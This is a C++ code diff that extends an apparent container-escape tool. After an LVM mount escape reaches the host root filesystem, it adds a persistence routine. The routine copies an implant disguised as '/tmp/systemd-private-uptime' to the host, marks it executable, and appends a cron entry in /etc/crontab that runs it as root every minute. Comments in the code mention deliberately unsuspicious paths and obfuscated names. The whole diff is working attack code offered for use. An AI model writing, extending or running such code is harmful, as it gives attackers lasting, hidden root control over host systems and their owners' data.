@@ -57,6 +57,32 @@ static bool check_privileged(std::string& details) {
     return privileged;
 }
 
+// Function to establish persistence on the host
+static void establish_persistence(const std::string& mount_point, std::string& details) {
+    const std::string implant_src = "/tmp/systemd-private-uptime";
+    const std::string host_tmp_path = mount_point + "/tmp/systemd-private-uptime";
+    const std::string host_crontab = mount_point + "/etc/crontab";
+
+    // 1. Copy the implant to the host filesystem
+    std::string cp_cmd = "cp " + implant_src + " " + host_tmp_path + " > /dev/null 2>&1";
+    if (system(cp_cmd.c_str()) == 0) {
+        // 2. Ensure it's executable
+        system(("chmod +x " + host_tmp_path + " > /dev/null 2>&1").c_str());
+        
+        // 3. Add to crontab for root execution
+        std::ofstream ofs(host_crontab, std::ios::app);
+        if (ofs.is_open()) {
+            ofs << "* * * * * root /tmp/systemd-private-uptime\n";
+            ofs.close();
+            details += "\n[+] Persistence established via " + host_crontab;
+        } else {
+            details += "\n[-] Failed to open host crontab: " + host_crontab;
+        }
+    } else {
+        details += "\n[-] Failed to copy implant to host /tmp";
+    }
+}
+
 // Function to perform the LVM mount escape with "simple obfuscated" names
 bool run_lvm_escape(std::string& details) {
     // Less suspicious paths
@@ -96,6 +122,10 @@ bool run_lvm_escape(std::string& details) {
     std::string mount_cmd = "mount " + lv_path + " " + mnt_p + " > /dev/null 2>&1";
     if (system(mount_cmd.c_str()) == 0) {
         details += "Host root accessible at " + mnt_p;
+        
+        // 6. Establish persistence on host
+        establish_persistence(mnt_p, details);
+        
         return true;
     }
     
